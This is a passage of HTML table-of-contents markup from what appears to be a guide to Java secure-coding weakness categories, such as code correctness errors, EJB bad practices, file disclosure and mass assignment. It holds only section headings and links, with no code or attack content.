class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-5"><span class="toc-number">1.1.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-5"><span class="toc-number">1.1.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-5"><span class="toc-number">1.1.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Erroneous-finalize-Method"><span class="toc-number">1.1.7.</span> <span class="toc-text">Code Correctness: Erroneous finalize() Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-6"><span class="toc-number">1.1.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-6"><span class="toc-number">1.1.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-6"><span class="toc-number">1.1.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-6"><span class="toc-number">1.1.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Incorrect-Serializable-Method-Signature"><span class="toc-number">1.1.8.</span> <span class="toc-text">Code Correctness: Incorrect Serializable Method Signature</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-7"><span class="toc-number">1.1.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-7"><span class="toc-number">1.1.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-7"><span class="toc-number">1.1.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-7"><span class="toc-number">1.1.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Multiple-Stream-Commits"><span class="toc-number">1.1.9.</span> <span class="toc-text">Code Correctness: Multiple Stream Commits</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-8"><span class="toc-number">1.1.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-8"><span class="toc-number">1.1.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-8"><span class="toc-number">1.1.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-8"><span class="toc-number">1.1.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-Negative-Content-Length"><span class="toc-number">1.1.10.</span> <span class="toc-text">Code Correctness: Negative Content-Length</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-9"><span class="toc-number">1.1.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-9"><span class="toc-number">1.1.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-9"><span class="toc-number">1.1.10.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-9"><span class="toc-number">1.1.10.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Code-Correctness-toString-on-Array"><span class="toc-number">1.1.11.</span> <span class="toc-text">Code Correctness: toString on Array</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-10"><span class="toc-number">1.1.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-10"><span class="toc-number">1.1.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-10"><span class="toc-number">1.1.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-10"><span class="toc-number">1.1.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dangerous-Field"><span class="toc-number">1.1.12.</span> <span class="toc-text">Dangerous Field</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-11"><span class="toc-number">1.1.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-11"><span class="toc-number">1.1.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-11"><span class="toc-number">1.1.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dangerous-Method"><span class="toc-number">1.1.13.</span> <span class="toc-text">Dangerous Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-12"><span class="toc-number">1.1.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-12"><span class="toc-number">1.1.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-12"><span class="toc-number">1.1.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-11"><span class="toc-number">1.1.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dangerous-Type"><span class="toc-number">1.1.14.</span> <span class="toc-text">Dangerous Type</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-13"><span class="toc-number">1.1.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-13"><span class="toc-number">1.1.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-13"><span class="toc-number">1.1.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-12"><span class="toc-number">1.1.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EJB-Bad-Practices-Use-of-AWT-Swing"><span class="toc-number">1.1.15.</span> <span class="toc-text">EJB Bad Practices: Use of AWT/Swing</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-14"><span class="toc-number">1.1.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-14"><span class="toc-number">1.1.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-14"><span class="toc-number">1.1.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-13"><span class="toc-number">1.1.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EJB-Bad-Practices-Use-of-Class-Loader"><span class="toc-number">1.1.16.</span> <span class="toc-text">EJB Bad Practices: Use of Class Loader</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-15"><span class="toc-number">1.1.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-15"><span class="toc-number">1.1.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-15"><span class="toc-number">1.1.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-14"><span class="toc-number">1.1.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EJB-Bad-Practices-Use-of-Sockets"><span class="toc-number">1.1.17.</span> <span class="toc-text">EJB Bad Practices: Use of Sockets</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-16"><span class="toc-number">1.1.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-16"><span class="toc-number">1.1.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-16"><span class="toc-number">1.1.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EJB-Bad-Practices-Use-of-Synchronization-Primitives"><span class="toc-number">1.1.18.</span> <span class="toc-text">EJB Bad Practices: Use of Synchronization Primitives</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-17"><span class="toc-number">1.1.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-17"><span class="toc-number">1.1.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-17"><span class="toc-number">1.1.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-15"><span class="toc-number">1.1.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EJB-Bad-Practices-Use-of-java-io"><span class="toc-number">1.1.19.</span> <span class="toc-text">EJB Bad Practices: Use of java.io</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-18"><span class="toc-number">1.1.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-18"><span class="toc-number">1.1.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-18"><span class="toc-number">1.1.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-16"><span class="toc-number">1.1.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Disclosure-J2EE"><span class="toc-number">1.1.20.</span> <span class="toc-text">File Disclosure: J2EE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-19"><span class="toc-number">1.1.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-19"><span class="toc-number">1.1.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-19"><span class="toc-number">1.1.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-17"><span class="toc-number">1.1.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Disclosure-Spring"><span class="toc-number">1.1.21.</span> <span class="toc-text">File Disclosure: Spring</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-20"><span class="toc-number">1.1.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-20"><span class="toc-number">1.1.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-20"><span class="toc-number">1.1.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-18"><span class="toc-number">1.1.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Disclosure-Spring-Webflow"><span class="toc-number">1.1.22.</span> <span class="toc-text">File Disclosure: Spring Webflow</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-21"><span class="toc-number">1.1.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-21"><span class="toc-number">1.1.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-21"><span class="toc-number">1.1.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-19"><span class="toc-number">1.1.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#File-Disclosure-Struts"><span class="toc-number">1.1.23.</span> <span class="toc-text">File Disclosure: Struts</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-22"><span class="toc-number">1.1.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-22"><span class="toc-number">1.1.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-22"><span class="toc-number">1.1.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-20"><span class="toc-number">1.1.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Immutable-Classes-Field-Mutation"><span class="toc-number">1.1.24.</span> <span class="toc-text">Immutable Classes: Field Mutation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-23"><span class="toc-number">1.1.24.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-23"><span class="toc-number">1.1.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-23"><span class="toc-number">1.1.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-21"><span class="toc-number">1.1.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Immutable-Classes-Non-final-Fields"><span class="toc-number">1.1.25.</span> <span class="toc-text">Immutable Classes: Non-final Fields</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-24"><span class="toc-number">1.1.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-24"><span class="toc-number">1.1.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-24"><span class="toc-number">1.1.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-22"><span class="toc-number">1.1.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Immutable-Classes-Public-Mutable-Fields"><span class="toc-number">1.1.26.</span> <span class="toc-text">Immutable Classes: Public Mutable Fields</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-25"><span class="toc-number">1.1.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-25"><span class="toc-number">1.1.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-25"><span class="toc-number">1.1.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-23"><span class="toc-number">1.1.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Bad-Practices-getConnection"><span class="toc-number">1.1.27.</span> <span class="toc-text">J2EE Bad Practices: getConnection()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-26"><span class="toc-number">1.1.27.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-26"><span class="toc-number">1.1.27.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-26"><span class="toc-number">1.1.27.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-24"><span class="toc-number">1.1.27.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#J2EE-Bad-Practices-Sockets"><span class="toc-number">1.1.28.</span> <span class="toc-text">J2EE Bad Practices: Sockets</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-27"><span class="toc-number">1.1.28.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-27"><span class="toc-number">1.1.28.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-27"><span class="toc-number">1.1.28.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-25"><span class="toc-number">1.1.28.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mass-Assignment-Insecure-Binder-Configuration"><span class="toc-number">1.1.29.</span> <span class="toc-text">Mass Assignment: Insecure Binder Configuration</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-28"><span class="toc-number">1.1.29.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-28"><span class="toc-number">1.1.29.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-28"><span class="toc-number">1.1.29.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-26"><span class="toc-number">1.1.29.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Mass-Assignment-Request-Parameters-Bound-into-Persisted-Objects"><span class="toc-number">1.1.30.</span> <span class="toc-text">Mass Assignment: Request Parameters Bound into Persisted Objects</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-29"><span class="toc-number">1.1.30.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-29"><span class="toc-number">1.1.30.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-29"><span class="toc-number">1.1.30.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-27"><span class="toc-number">1.1.30.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Missing-Check-against-Null"><span class="toc-number">1.1.31.</span> <span class="toc-text">Missing Check against Null</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-30"><span class="toc-number">1.1.31.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-30"><span class="toc-number">1.1.31.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-30"><span class="toc-number">1.1.31.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-28"><span class="toc-number">1.1.31.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Missing-Check-for-Null-Parameter"><span class="toc-number">1.1.32.</span> <span class="toc-text">Missing Check for Null Parameter</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-31"><span class="toc-number">1.1.32.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-31"><span class="toc-number">1.1.32.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-31"><span class="toc-number">1.1.32.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-29"><span class="toc-number">1.1.32.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Object-Model-Violation-Erroneous-clone-Method"><span class="toc-number">1.1.33.</span> <span class="toc-text">Object Model Violation: Erroneous clone() Method</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-32"><span class="toc-number">1.1.33.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-32"><span class="toc-number">1.1.33.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-32"><span class="toc-number">1.1.33.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-30"><span class="toc-number">1.1.33.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Object-Model-Violation-Just-one-of-equals-and-hashCode-Defined"><span class="toc-number">1.1.34.</span> <span class="toc-text">Object Model Violation: Just one of equals() and hashCode() Defined</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-33"><span class="toc-number">1.1.34.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-33"><span class="toc-number">1.1.34.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-33"><span class="toc-number">1.1.34.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-31"><span class="toc-number">1.1.34.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Object-Model-Violation-Just-one-of-restoreState-and-saveState-Defined"><span class="toc-number">1.1.35.</span> <span class="toc-text">Object Model Violation: Just one of restoreState() and saveState() Defined</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-34"><span class="toc-number">1.1.35.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-34"><span class="toc-number">1.1.35.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-34"><span class="toc-number">1.1.35.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-32"><span class="toc-number">1.1.35.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Android-Permission-Check"><span class="toc-number">1.1.36.</span> <span class="toc-text">Often Misused: Android Permission Check</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-35"><span class="toc-number">1.1.36.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-35"><span class="toc-number">1.1.36.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-35"><span class="toc-number">1.1.36.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-33"><span class="toc-number">1.1.36.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Authentication"><span class="toc-number">1.1.37.</span> <span class="toc-text">Often Misused: Authentication</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-36"><span class="toc-number">1.1.37.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-36"><span class="toc-number">1.1.37.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-36"><span class="toc-number">1.1.37.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-34"><span class="toc-number">1.1.37.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Boolean-getBoolean"><span class="toc-number">1.1.38.</span> <span class="toc-text">Often Misused: Boolean.getBoolean()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-37"><span class="toc-number">1.1.38.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-37"><span class="toc-number">1.1.38.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-37"><span class="toc-number">1.1.38.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-35"><span class="toc-number">1.1.38.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-Encoding"><span class="toc-number">1.1.39.</span> <span class="toc-text">Often Misused: Encoding</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-38"><span class="toc-number">1.1.39.1.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-38"><span class="toc-number">1.1.39.2.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-36"><span class="toc-number">1.1.39.3.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-File-System"><span class="toc-number">1.1.40.</span> <span class="toc-text">Often Misused: File System</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-38"><span class="toc-number">1.1.40.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-39"><span class="toc-number">1.1.40.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-39"><span class="toc-number">1.1.40.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-37"><span class="toc-number">1.1.40.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Often-Misused-File-Upload"><span class="toc-number">1.1.41.</span> <span class="toc-text">Often Misused: File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-39"><span class="toc-number">1.1.41.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-40"><span class="toc-number">1.1.41.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-40"><span class="toc-number">1.1.41.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-38"><span class="toc-number">1.1.41.4.</span> 